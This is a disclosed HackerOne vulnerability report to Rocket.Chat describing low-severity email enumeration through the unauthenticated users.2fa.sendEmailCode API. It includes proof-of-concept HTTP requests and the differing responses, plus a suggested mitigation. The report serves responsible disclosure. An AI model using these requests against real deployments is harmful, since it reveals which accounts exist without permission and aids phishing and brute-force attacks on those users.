# Hi! Security Team Rocket.Chat, It's possible to get information about the users emails without authentication

## Report Details
- **Report ID**: 1089116
- **URL**: https://hackerone.com/reports/1089116
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-01-28T01:28:10.049Z
- **Disclosed**: 2021-04-29T15:09:06.025Z

## Reporter
- **Username**: khekhe
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rocket_chat

## Vulnerability Information
**Description:** 
Email enumeration vulnerability.
Vulnerable api method: ```/api/v1/users.2fa.sendEmailCode```

##Releases Affected::

  * Rocket.Chat up to 3.10.5

Request for existing account:
```
POST /api/v1/users.2fa.sendEmailCode HTTP/1.1
Host: rocket-chat.local:3000
Referer: http://rocket-chat.local:3000/home
Connection: close
Content-Length: 36
Content-Type: application/json;charset=UTF-8

{"emailOrUsername":"test@test.test"}
```
Response
```
HTTP/1.1 200 OK
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
X-RateLimit-Limit: 10
X-RateLimit-Remaining: 7
X-RateLimit-Reset: 1611804788737
content-type: application/json
Content-Length: 16

{"success":true}
```
Request for non-existent account:
```
POST /api/v1/users.2fa.sendEmailCode HTTP/1.1
Host: rocket-chat.local:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://rocket-chat.local:3000/home
Connection: close
Content-Length: 37
Content-Type: application/json;charset=UTF-8

{"emailOrUsername":"test2@test.test"}
```
Response
```
HTTP/1.1 400 Bad Request
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
Pragma: no-cache
X-RateLimit-Limit: 10
X-RateLimit-Remaining: 9
X-RateLimit-Reset: 1611805550459
Content-Length: 94

{"success":false,"error":"Invalid user [error-invalid-user]","errorType":"error-invalid-user"}
```


## Suggested mitigation

  * Use general messages when a user exists in the system and when user doesn't exist in the system.

## Impact

Information disclosure which opens new attack vectors - helpful for injections/brute-force attacks/social-engineering etc.

## Attachments
No attachments
